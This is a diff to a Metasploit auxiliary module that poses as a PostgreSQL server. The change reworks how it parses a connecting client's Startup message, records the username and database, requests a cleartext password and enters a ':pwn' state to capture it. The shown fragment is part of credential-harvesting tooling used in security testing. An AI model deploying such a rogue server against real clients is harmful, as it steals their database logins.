@@ -3,6 +3,8 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
+require 'postgres/postgres-pr/message'
+
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::TcpServer
   include Msf::Auxiliary::Report
@@ -88,16 +90,24 @@ class MetasploitModule < Msf::Auxiliary
       # SSL request
       client.put 'N'
       @state[client]['status'] = :send_auth_type
-    elsif @state[client]['status'] == :send_auth_type
-      # Startup message
-      data.slice!(0, 4).unpack('N')[0] # skip over length
-      data.slice!(0, 4).unpack('N')[0] # skip over protocol
+    elsif %i[init send_auth_type].include?(@state[client]['status'])
+      # SSLRequest is optional; sslmode=disable sends Startup directly.
+      return unless data.bytesize >= 8 && data.bytesize == length
+
+      begin
+        startup = Msf::Db::PostgresPR::StartupMessage.create(Msf::Db::Buffer.from_string(data))
+      rescue Msf::Db::PostgresPR::ParseError, Msf::Db::Buffer::Error => e
+        vprint_error('Unable to parse PostgreSQL client Startup message')
+        elog('Unable to parse PostgreSQL client Startup message', error: e)
+        client.close
+        return
+      end
+      return unless startup.params['user']
+
+      @state[client][:username] = startup.params['user']
+      @state[client][:database] = startup.params['database'] || @state[client][:username]
       sdata = [ 0x52, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x03 ].pack('C*')
       client.put sdata
-      data.slice!(0, 5) # skip over "user\x00"
-      @state[client][:username] = data.slice!(0, data.index("\x00") + 1).unpack('Z*')[0]
-      data.slice!(0, 9) # skip over "database\x00"
-      @state[client][:database] = data.slice!(0, data.index("\x00") + 1).unpack('Z*')[0]
       @state[client]['status'] = :pwn
     elsif (@state[client]['status'] == :pwn) && (data[0] == 'p')
       # Password message
